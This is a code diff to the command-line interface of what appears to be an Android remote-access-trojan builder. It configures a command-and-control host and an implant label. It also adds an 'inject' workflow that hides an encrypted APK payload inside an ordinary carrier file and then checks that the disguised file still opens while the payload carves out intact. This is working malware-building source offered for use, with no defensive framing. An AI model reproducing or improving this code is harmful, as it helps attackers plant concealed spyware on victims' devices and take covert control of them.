@@ -13,7 +13,7 @@ import os
 import re
 from typing import List, Optional
 
-from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED, YELLOW
+from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED
 
 from . import builder, ios, polyglot, samples, sdk, server, store, term, ui
 
@@ -103,21 +103,23 @@ def _ensure_config(spec: str = "rat") -> dict:
         try:
             with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
                 existing = json.load(handle)
-            existing.setdefault("spec", "rat")
-            if spec != "rat" and existing.get("spec") != spec:
-                existing["spec"] = spec
-                existing["modules"] = sorted(set(builder.CORE_MODULES + builder.SPECS[spec]))
+            current = existing.setdefault("spec", "rat")
+            desired = spec if spec != "rat" else current
+            modules = sorted(set(builder.CORE_MODULES + builder.SPECS[desired]))
+            if current != desired or existing.get("modules") != modules:
+                existing["spec"] = desired
+                existing["modules"] = modules
                 with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
                     json.dump(existing, handle, indent=2)
             return existing
         except (OSError, ValueError):
             pass
     print(term.Dim + "  no config yet — two fields, then it stops asking." + term.RESET)
-    host = input(_colored("  C2 host (https://host): ", B_GREEN)).strip()
-    if not host:
-        raise SystemExit(_colored("  host required", RED))
+    lan = builder.detect_lan()
+    host = input(_colored(f"  C2 host [auto → http://{lan}:8443]: ", B_GREEN)).strip() or "auto"
     label = input(_colored("  implant label [android]: ", B_GREEN)).strip() or "android"
     config = builder.make_config(host, _psk_b64(), label, 60000, True, "", spec)
+    print(term.label("resolved", 11) + term.Bright + str(config["host"]) + term.RESET)
     os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
     with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
         json.dump(config, handle, indent=2)
@@ -202,36 +204,60 @@ def _resolve_carrier(target: str) -> Optional[str]:
     return None
 
 
-def _inject(spec: str, target: str) -> None:
-    """inject <spec> <file> — hide the payload inside `target` (or make one)."""
+def _verify_carrier(result) -> bool:
+    """Container still parses AND the payload carves back byte-identical."""
+    from hashlib import sha256
+
+    report = polyglot.verify(result.carrier)
+    data = open(result.carrier, "rb").read()
+    blob = polyglot.carve(data, result.start or polyglot.START)
+    if result.sealed:
+        blob = polyglot.open_payload(blob, bytes.fromhex(result.key))
+    ok = bool(report.get("ok")) and sha256(blob).hexdigest() == result.digest
+    print(term.label("verified", 11) + (term.Good + "carrier intact · payload byte-identical"
+                                        if ok else term.Bad + "VERIFY FAILED") + term.RESET)
+    return ok
+
+
+def _inject(first: str, second: str = "") -> None:
+    """inject <file> [spec] — also accepts the old <spec> <file> order."""
+    target, spec = (first, second)
+    if first.lower() in builder.SPECS and second:
+        spec, target = first, second
+    spec = (spec or _config_spec()).lower()
     if spec not in builder.SPECS:
-        print(term.Warn + f"  unknown spec {spec!r} — {SPECS}" + term.RESET)
-        return
+        spec = "rat"
     target = target.strip("\"'")
     ext = os.path.splitext(target)[1].lower().lstrip(".")
     if ext not in polyglot.MODES:
         print(term.Warn + f"  no carrier recipe for .{ext or '?'} — "
               + ", ".join(sorted(polyglot.MODES)) + term.RESET)
         return
-    apk = _latest_apk()
-    if not apk:
-        print(term.Dim + "  no APK yet — building one first" + term.RESET)
-        apk = _build_apk("agent", spec)
+    source = _resolve_carrier(target)
+    if not source:
+        print(term.Bad + f"  carrier not found: {target}" + term.RESET)
+        return
+    apk = _latest_apk() or _build_apk("agent", spec)
     folder = os.path.join(store.ROOT, "dist", spec)
     os.makedirs(folder, exist_ok=True)
-    source = _resolve_carrier(target)
-    if source:
-        print(term.label("carrier", 11) + term.Dim + source + term.RESET)
-    else:
-        source = samples.sample(ext, folder)
-        print(term.label("carrier", 11) + term.Dim + f"sample {source}" + term.RESET)
+    print(term.label("carrier", 11) + term.Dim + source + term.RESET)
+    print(term.label("real", 11) + term.Dim
+          + f"{os.path.getsize(source):,} bytes preserved" + term.RESET)
     result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
     print(term.label("spec", 11) + term.Bright + spec + term.RESET)
-    print(term.label("carrier", 11) + term.Good + result.carrier + term.RESET)
+    print(term.label("output", 11) + term.Good + result.carrier + term.RESET)
     print(term.label("sealed", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
           + term.RESET)
+    _verify_carrier(result)
     for path in result.launchers:
         print(term.label("helper", 11) + term.Dim + path + term.RESET)
+
+
+def _config_spec() -> str:
+    try:
+        return str(json.loads(open(CONFIG_PATH, encoding="utf-8").read()).get("spec") or "rat")
+    except (OSError, ValueError):
+        return "rat"
 
 
 def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
@@ -250,6 +276,7 @@ def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
     print(term.label("carrier", 11) + term.Good + result.carrier + term.RESET)
     print(term.label("payload", 11) + term.Dim + f"{result.size:,} bytes · sha256 {result.digest[:16]}…"
           + term.RESET)
+    _verify_carrier(result)
     for path in result.launchers:
         print(term.label("helper", 11) + term.Dim + path + term.RESET)
 
@@ -463,7 +490,7 @@ def interactive() -> None:
                 if len(args) < 1:
                     print(term.Warn + "  inject <spec> <file>" + term.RESET)
                 else:
-                    _inject(args[0].lower(), args[1] if len(args) > 1 else "")
+                    _inject(args[0], args[1] if len(args) > 1 else "")
             elif verb == "make":
                 what = (args[0] if args else "").lower()
                 if what in ("apk", "app"):
